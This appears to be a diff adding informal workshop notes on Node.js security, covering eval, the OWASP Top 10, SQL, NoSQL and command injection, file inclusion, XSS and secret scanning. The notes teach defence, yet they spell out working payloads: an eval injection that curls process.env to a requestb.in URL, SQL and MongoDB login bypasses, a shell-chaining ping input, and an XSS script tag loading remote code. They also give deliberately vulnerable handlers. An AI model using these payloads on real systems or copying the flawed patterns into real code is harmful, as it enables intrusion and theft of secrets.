@@ -1,0 +1,453 @@
+## Security Posture
+
+### Have code quality standards
+- Many of us jumped right into writing codee, doing the work. 
+  There are no gatekeepers to the industry that prevent you
+  from becoming a engineer. No one to say you don't have x-degree or y-cert.
+  As a result I think there it is common for there to be this wild-wild-west mentality - as in there is lot's of Cowboy coding.
+
+  The problem with that is your application is a bank. It may be  
+  an atm, small bank, medium bank. Whatever it may be, it holds data
+  for which you are responsible.
+
+
+- Builds in thoughtfulness
+- You want to build a culture of thoughtfulness
+- Security starts with taking your code serious ... being disciplined
+- One of the first steps to caring about your code is setting expectations of quality and style
+- The Pragmatic Programmer: From Journeyman to Master
+
+http://amzn.to/2cfwToA
+
+Tools to set test quality
+- jslint - looks for problems in your code.
+- jshint - fork of jshint, more configuration
+- jscs.info
+- eslint.org - the newest most current tool. pluggable and highly configurarable
+
+
+https://www.codacy.com/ - buggy
+https://www.bithound.io/ - node specific
+https://codeclimate.com/
+
+
+
+### Never trust your users (input)
+- The inputs are the gates to your application
+- A bouncer doesn't assume everyone by default should be allowed in
+- Don't look for evil patterns, instead set expectations of valid content.
+  Hackers always find ways to get around filters
+
+## Don't assume no one will target you
+- botnets
+- spam sender
+- Target breached 
+http://krebsonsecurity.com/2014/02/target-hackers-broke-in-via-hvac-company/
+- Ultitmately can result in ip/domain on black list
+
+
+## General Javascript Security Tips
+
+### Use strict
+```js
+cat = "moeow";
+console.log(cat);
+```
+
+
+```js
+'use strict';
+cat = "moeow";
+console.log(cat);
+```
+
+```
+cat = "moeow";
+    ^
+
+ReferenceError: cat is not defined
+```
+
+When you don't exlicity add a variable to the global context, it's
+easy to loose track of the variable  and introduce weird bugss
+
+
+
+### eval can be evil
+- Eval allows a string to be evaluated as Javascript
+- Eval cames in many forms. `eval, setInterval('), setTimeout, new Function('return {};');`
+  Pretty much anything that takes a string value of a function name for example and executes 
+  it is a form of eval
+  
+```js
+function doWork() {
+  console.log('work, work, 'work');
+}
+
+eval('doWork');
+setInterval('doWork', 1000);
+setTimeout('doWork', 2000);
+var fn = new Function('return doWork();');
+fn();
+```
+
+- In the browser can do bad things, but on the server, can do reallllly bad things
+-  I generally don't say never use x, but eval is one of those functions that 
+   should never be used with direct user input. Back to the never trust your users.
+   If a "user" figures out an input is passed to eval they can exploit it.
+
+  Paypal was using the dust templating engine which had an eval in it 
+  to evaluate conditionals. (something admittadly I have done before)
+  
+  ``` js
+  if (eval('"' + input '" === '"' + fromDb + '"')) {
+	// do x
+  }
+  
+  input=pet
+  eval('"pet" === "cats"') // false
+  input=cats
+  eval('"cats" === "cats"') // false
+  input=";require("child_process").execSync(`curl -X POST http://requestb.in/uapxyvua -d \'${JSON.stringify(process.env)}\'`); "
+  eval('"";require("child_process").execSync(`curl -X POST http://requestb.in/uapxyvua -d \'${JSON.stringify(process.env)}\'`); ""=== "cats"'); // false
+  ```
+  PayPal eval http://artsploit.blogspot.com/2016/08/pprce2.html
+
+### Avoid globals
+- Back to example of eval, if you had important data in the global scope 
+ it would be easier to access
+- When you encapsulate data in scopes, data is less likely to leak
+- Limits scope of damage done by malicious code
+- There should be separation of data.
+
+Just imagine if you went to the bank and all the money not in a 
+vault, but was all in a pile that everyone could see. Would you want 
+to keep your money there? No, there is a proper separation!
+
+
+Now to dive into the world of security
+## OWASP
+- Open Web Application Security Project
+- OWASP is essentially the wikipedia of web application security
+- Covers descriptions of classifictaoins vulnernalbitiyies and examples
+- The learning assets for app sec
+- Most of what we will be covering
+
+###  Top 10
+- Covers top vulneranabilities
+-- Everyone should become familiriar with the OWASP top 10
+-- https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet
+
+#### 
+- 1 Injection > sql injection, cmd injection
+- 2 Weak authentication & session management	- no session timeouts, no https, no throttling
+- 3 XSS - render executable JavaScript in the browser	
+- 4 Insecure Direct Object References - id enumeratable
+- 5 Security Misconfiguration - redis is publiclly accessible, no auth required
+- 6 sensitive data exposure - plain text passwords
+- 7  Missing Function Level Access Control - access to PDFs generated isn't checked by application
+- 8 csrf - another server submits request on behalf of user to impersonate or steal
+- 9  Using Components with Known Vulnerabilities - using vulnerable npm modules or old verions of node
+- 10 Unvalidated Redirects and Forwards -
+
+
+## A1 Injection
+### Command
+
+### SQL
+- Use prepared statements
+```js
+'use strict';
+
+// npm myslq
+const connection = require('./db/mysql');
+
+module.exports.postLogin = function(req, res) {
+	const username = req.body.username;
+	const password = req.body.password;
+	const query = `SELECT * FROM users 
+			   WHERE username='${username}' 
+			   AND password=MD5('${password}')`;
+			   
+	connection.query(query, function (err, res, fields) {
+		// ....
+	});
+}
+```
+
+Lets translate as reqest into a query
+
+POST http://auth/login HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username=user
+&password=password123
+
+SELECT * FROM users 
+WHERE username = 'user'
+AND password = 'password123'
+
+So that looks like a normal valid query
+
+But was if someone makes this request
+POST http://auth/login HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username=admin' --
+&password=
+
+SELECT * FROM users 
+WHERE username = 'admin' --'
+AND password = ''
+LIMIT 	 
+
+
+and lets look at someone by sneaky
+
+```js
+'use strict';
+
+// npm knex
+const knex = require('./db/knex');
+
+module.exports.postLogin = function(req, res) {
+	const username = req.body.username;
+	const password = req.body.password;
+	knex('users').where({
+		username: username,
+		password: password
+	}).select('id');	
+}
+```
+
+  
+SELECT * FROM users 
+WHERE username = ? 
+AND password = ?
+LIMIT 
+
+
+Now you may be working on mongodb or another 
+document based database system that can use 
+json based queries
+
+http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html
+{"username": {"$gt": ""},"password": {"$gt": ""}}
+
+```js
+
+const mongo = require('./db/mongodb');
+
+module.exports.postLogin = function(req, res) {
+  const username = req.body.username;
+  const password = req.body.password;
+
+  mongo.users
+    .find({username, password})
+    .then(res => {
+      if (res.length > 0) {
+        // authenicated user
+      } 
+    })
+}
+```
+
+You expect the username to be a string and 
+the password to be a string as well. But what if 
+that route expects json, you are probably using 
+an express middleware for handling the data. 
+That data can be any sort of data, 
+
+
+```
+POST http://target/ HTTP/1.1
+Content-Type: application/json
+
+{
+  "username": {"$gt": ""},
+  "password": {"$gt": ""}
+}
+```
+
+If there is a username that has more chars than none,
+and is there a password that has charts that none.
+
+
+To address this problem, ensure the data types
+are what you expect!
+
+```js
+
+const mongo = require('./db/mongodb');
+
+module.exports.postLogin = function(req, res) {
+  const username = req.body.username;
+  const password = req.body.password;
+
+  if (typeof username !== 'string' || typeof password !== 'string') {
+    // bail!
+  }
+
+  mongo.users
+    .find({username, password})
+    .then(res => {
+      if (res.length > 0) {
+        // authenicated user
+      } 
+    })
+}
+
+`npm install express-validator`
+
+
+
+```js
+
+// app.use(expressValidator()); 
+
+
+module.exports.postLogin = function(req, res) {
+  req.checkBody({
+   'username': {
+      notEmpty: true,
+      isEmail: {
+        errorMessage: 'Invalid Email'
+      }
+    },
+    'password': {
+      notEmpty: true,
+      isLength: {
+      options: [{ min: 10 }],
+        errorMessage: 'Please fill out your password'
+      },
+    },
+  });
+
+
+  var errors = req.validationErrors();
+  if (errors) {
+    res.send('Hmmm, try again, seem to be missing the username or password');
+    return;
+  }
+
+  const username = req.body.username;
+  const password = req.body.password;
+
+  mongo.users
+    .find({username, password})
+    .then(res => {
+      if (res.length > 0) {
+        // authenicated user
+      } 
+    })
+}
+
+```
+
+### Command Injection
+  
+```js
+'use strict';
+
+const shell = require('child_process').exec;
+
+module.exports.pingServer = function(req, res) {
+  const address = req.body.address;
+
+  shell(`ping ${address} -n 1`, (err, stdout) => {
+    res.text(stdout);
+  });
+}
+
+
+```
+POST http://target/ping HTTP/1.1
+Content-Type: application/json
+
+{"address": "ebay.com"}
+```
+
+```
+Pinging ebay.com [66.211.185.25] with 32 bytes of data:
+Request timed out.
+
+Ping statistics for 66.211.185.25:
+    Packets: Sent = 1, Received = 0, Lost = 1 (100% loss),
+```
+
+```
+POST http://target/ping HTTP/1.1
+Content-Type: application/json
+
+{"address": "localhost && ls ../"}
+```
+
+```
+Pinging rezen-pad [::1] with 32 bytes of data:
+Reply from ::1: time<1ms
+
+Ping statistics for ::1:
+    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 0ms, Maximum = 0ms, Average = 0ms
+./:
+total 33
+drwxr-xr-x 1 1000 513     0 Sep 10 23:01 include-all
+drwxr-xr-x 1 1000 513     0 Sep  7 22:25 leaky-secrets
+drwxr-xr-x 1 1000 513     0 Sep  6 21:50 module-safely
+-rw-r--r-- 1 1000 513 11048 Sep 11 13:44 notes.txt
+-rw-r--r-- 1 1000 513   151 Sep  6 21:37 package.json
+drwxr-xr-x 1 1000 513     0 Sep 10 23:46 ping-pong
+drwxr-xr-x 1 1000 513     0 Sep 10 21:40 strict
+drwxr-xr-x 1 1000 513     0 Sep 11 13:20 xss
+```
+
+https://requestb.in/1d3o4kp1
+http://blog.portswigger.net/2015/08/server-side-template-injection.html#Jade
+
+
+### Local File Inclusion
+
+
+```js
+'use strict';
+
+module.exports.fileEditor = function(req, res) {
+	const filename = req.query.file;
+	
+	fs.readFile(filename, (err, data) => {
+		res.render('editor, {filename, data});
+	});
+}
+
+```
+
+### XSS - Cross site scripting
+- Hello my username is <script src="http://pastebin.com/raw/Yqmv8nn5b5"></script>
+- Steal user tokens user session
+- Make requests as a user, such as admin users 
+- Steal passwords
+
+
+https://blog.risingstack.com/node-js-security-checklist/
+https://github.com/OWASP/NodeGoat
+
+### Configurationpa
+https://github.com/inikulin/publish-please#sensitive-information-audit
+https://github.com/awslabs/git-secrets
+https://github.com/18F/laptop/tree/master/secret-patterns
+
+
+cd ./secrets
+git-secrets --add 'password\s*=\s*.+'     
+git-secrets --add '.+token\s*=\s*.+' 
+git-secrets --scan -r ./conf
+
+https://github.com/search?utf8=%E2%9C%93&q=xoxp&type=Code&ref=searchresults
+https://12factor.net/
+https://github.com/michenriksen/gitrob
+https://github.com/josh/senv
+https://github.com/ChALkeR/notes/blob/master/Do-not-underestimate-credentials-leaks.md#common-sources-of-leaks
+
+
+https://www.pingdom.com/
